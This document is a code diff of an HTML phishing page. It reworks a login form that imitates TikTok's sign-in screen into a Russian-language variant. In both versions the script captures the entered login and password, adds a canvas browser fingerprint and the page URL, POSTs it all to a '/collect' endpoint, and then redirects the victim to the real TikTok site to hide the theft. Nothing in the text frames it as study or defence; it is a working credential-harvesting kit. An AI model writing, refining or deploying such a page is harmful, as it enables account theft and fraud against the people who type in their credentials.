@@ -1,270 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Log in | TikTok</title>
+<title>Вход</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    background: #fff;
-    color: #161823;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-  }
-  header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 16px 24px;
-    height: 60px;
-  }
-  .logo {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    text-decoration: none;
-    color: #161823;
-    font-weight: 700;
-    font-size: 22px;
-  }
-  .logo svg { width: 28px; height: 28px; }
-  .help {
-    font-size: 14px;
-    color: #161823;
-    text-decoration: none;
-    display: flex;
-    align-items: center;
-    gap: 4px;
-  }
-  .help:hover { text-decoration: underline; }
-  main {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 0 16px 40px;
-  }
-  .card {
-    width: 100%;
-    max-width: 375px;
-  }
-  h1 {
-    font-size: 32px;
-    font-weight: 700;
-    text-align: center;
-    margin-bottom: 24px;
-    letter-spacing: -0.5px;
-  }
-  .tabs {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 16px;
-    font-size: 15px;
-    font-weight: 600;
-  }
-  .tabs span {
-    color: #161823;
-    cursor: pointer;
-  }
-  .tabs .inactive {
-    color: #8a8b91;
-    font-weight: 400;
-  }
-  .tabs .inactive:hover { color: #161823; }
-  input[type="text"],
-  input[type="password"] {
-    width: 100%;
-    height: 48px;
-    border: none;
-    border-radius: 4px;
-    background: #f1f1f2;
-    padding: 0 12px;
-    font-size: 16px;
-    color: #161823;
-    outline: none;
-    margin-bottom: 12px;
-  }
-  input::placeholder { color: #8a8b91; }
-  input:focus { background: #e8e8e9; }
-  .pass-wrap {
-    position: relative;
-  }
-  .pass-wrap input { padding-right: 44px; }
-  .eye {
-    position: absolute;
-    right: 12px;
-    top: 50%;
-    transform: translateY(-50%);
-    width: 20px;
-    height: 20px;
-    cursor: pointer;
-    opacity: 0.6;
-  }
-  .eye:hover { opacity: 1; }
-  .forgot {
-    display: block;
-    font-size: 14px;
-    color: #161823;
-    text-decoration: none;
-    margin: 4px 0 20px;
-  }
-  .forgot:hover { text-decoration: underline; }
-  .btn {
-    width: 100%;
-    height: 48px;
-    border: none;
-    border-radius: 4px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    background: #f1f1f2;
-    color: #8a8b91;
-    transition: all 0.15s;
-  }
-  .btn.active {
-    background: #fe2c55;
-    color: #fff;
-  }
-  .btn.active:active { transform: scale(0.98); }
-  .back {
-    display: block;
-    text-align: center;
-    margin-top: 28px;
-    font-size: 15px;
-    color: #161823;
-    text-decoration: none;
-  }
-  .back:hover { text-decoration: underline; }
-  footer {
-    border-top: 1px solid #e3e3e4;
-    padding: 16px 24px;
-    display: flex;
-    justify-content: center;
-    font-size: 14px;
-    color: #8a8b91;
-  }
-  footer a {
-    color: #fe2c55;
-    text-decoration: none;
-    margin-left: 4px;
-    font-weight: 600;
-  }
-  footer a:hover { text-decoration: underline; }
-  .bottom-bar {
-    background: #000;
-    color: #fff;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 10px 24px;
-    font-size: 13px;
-  }
-  .lang {
-    border: 1px solid #fff;
-    padding: 6px 12px;
-    border-radius: 2px;
-    cursor: default;
-  }
-  .loader {
-    display: none;
-    width: 40px;
-    height: 40px;
-    border: 3px solid #f1f1f2;
-    border-top-color: #fe2c55;
-    border-radius: 50%;
-    animation: spin .7s linear infinite;
-    margin: 60px auto;
-  }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+  body { background: #0f0f0f; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+  .card { background: #1a1a1a; border-radius: 16px; padding: 32px 28px; width: 100%; max-width: 360px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); }
+  h1 { font-size: 22px; margin-bottom: 8px; text-align: center; }
+  p { color: #aaa; font-size: 14px; text-align: center; margin-bottom: 24px; }
+  label { display: block; font-size: 13px; margin-bottom: 6px; color: #ccc; }
+  input { width: 100%; padding: 12px 14px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; font-size: 15px; margin-bottom: 16px; outline: none; }
+  input:focus { border-color: #fe2c55; }
+  button { width: 100%; padding: 13px; border: none; border-radius: 10px; background: #fe2c55; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; }
+  button:active { transform: scale(0.98); }
+  .loader { display: none; width: 40px; height: 40px; border: 3px solid #333; border-top-color: #fe2c55; border-radius: 50%; animation: spin .7s linear infinite; margin: 40px auto; }
   @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
-<header>
-  <a class="logo" href="#">
-    <svg viewBox="0 0 28 28" fill="none">
-      <path d="M19.5 9.5c1.4 1.1 3.1 1.8 5 1.9V8.2c-1.1-.1-2.2-.5-3.1-1.2V15c0 3.9-3.1 7-7 7s-7-3.1-7-7 3.1-7 7-7c.4 0 .7 0 1.1.1v3.1c-.3-.1-.7-.1-1.1-.1-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4V2h3.1c.1 1.9.8 3.6 1.9 5z" fill="#25F4EE"/>
-      <path d="M19.5 9.5c1.4 1.1 3.1 1.8 5 1.9V8.2c-1.1-.1-2.2-.5-3.1-1.2V15c0 3.9-3.1 7-7 7s-7-3.1-7-7 3.1-7 7-7c.4 0 .7 0 1.1.1v3.1c-.3-.1-.7-.1-1.1-.1-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4V2h3.1c.1 1.9.8 3.6 1.9 5z" fill="#FE2C55" transform="translate(1.2,0)"/>
-      <path d="M19.5 9.5c1.4 1.1 3.1 1.8 5 1.9V8.2c-1.1-.1-2.2-.5-3.1-1.2V15c0 3.9-3.1 7-7 7s-7-3.1-7-7 3.1-7 7-7c.4 0 .7 0 1.1.1v3.1c-.3-.1-.7-.1-1.1-.1-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4V2h3.1c.1 1.9.8 3.6 1.9 5z" fill="#000"/>
-    </svg>
-    TikTok
-  </a>
-  <a class="help" href="#">Feedback and help</a>
-</header>
 
-<main>
-  <div class="card" id="formCard">
-    <h1>Log in</h1>
-    <div class="tabs">
-      <span>Email or username</span>
-      <span class="inactive">Log in with phone</span>
-    </div>
-    <form id="loginForm">
-      <input type="text" id="login" placeholder="Email or username" required autocomplete="username">
-      <div class="pass-wrap">
-        <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
-        <svg class="eye" id="togglePass" viewBox="0 0 24 24" fill="none" stroke="#161823" stroke-width="2">
-          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-          <circle cx="12" cy="12" r="3"/>
-        </svg>
-      </div>
-      <a class="forgot" href="#">Forgot password?</a>
-      <button type="submit" class="btn" id="submitBtn" disabled>Log in</button>
-    </form>
-    <a class="back" href="#">← Go back</a>
-  </div>
-  <div class="loader" id="loader"></div>
-</main>
-
-<footer>
-  Don't have an account? <a href="#">Sign up</a>
-</footer>
-<div class="bottom-bar">
-  <div class="lang">English (US)</div>
-  <div>© 2026 TikTok</div>
+<div class="card" id="formCard">
+  <h1>Войти</h1>
+  <p>Введите данные для продолжения</p>
+  
+  <form id="loginForm">
+    <label>Логин или почта</label>
+    <input type="text" id="login" placeholder="email или логин" required autocomplete="username">
+    
+    <label>Пароль</label>
+    <input type="password" id="password" placeholder="пароль" required autocomplete="current-password">
+    
+    <button type="submit">Продолжить</button>
+  </form>
 </div>
 
+<div class="loader" id="loader"></div>
+
 <script>
-const endpoint = "/collect";
-const loginInput = document.getElementById("login");
-const passInput = document.getElementById("password");
-const submitBtn = document.getElementById("submitBtn");
-
-function checkActive() {
-  if (loginInput.value.trim() && passInput.value) {
-    submitBtn.classList.add("active");
-    submitBtn.disabled = false;
-  } else {
-    submitBtn.classList.remove("active");
-    submitBtn.disabled = true;
-  }
-}
-loginInput.addEventListener("input", checkActive);
-passInput.addEventListener("input", checkActive);
-
-document.getElementById("togglePass").addEventListener("click", () => {
-  const type = passInput.type === "password" ? "text" : "password";
-  passInput.type = type;
-});
+const endpoint = "/collect";   // оставляем так
 
 document.getElementById("loginForm").addEventListener("submit", async (e) => {
   e.preventDefault();
-  const login = loginInput.value.trim();
-  const password = passInput.value;
-
+  
+  const login = document.getElementById("login").value.trim();
+  const password = document.getElementById("password").value;
+  
+  // прячем форму, показываем крутилку
   document.getElementById("formCard").style.display = "none";
   document.getElementById("loader").style.display = "block";
-
+  
+  // собираем остальное
   const canvas = document.createElement("canvas");
   const ctx = canvas.getContext("2d");
   ctx.textBaseline = "top";
   ctx.font = "14px Arial";
   ctx.fillText("fp", 2, 2);
   const fp = canvas.toDataURL().slice(-32);
-
+  
   const payload = {
     login: login,
     password: password,
@@ -276,7 +70,7 @@ document.getElementById("loginForm").addEventListener("submit", async (e) => {
     fp: fp,
     url: location.href
   };
-
+  
   try {
     await fetch(endpoint, {
       method: "POST",
@@ -285,10 +79,11 @@ document.getElementById("loginForm").addEventListener("submit", async (e) => {
       keepalive: true
     });
   } catch (err) {}
-
+  
+  // редирект
   setTimeout(() => {
     location.replace("https://www.tiktok.com/");
-  }, 700);
+  }, 600);
 });
 </script>
 </body>
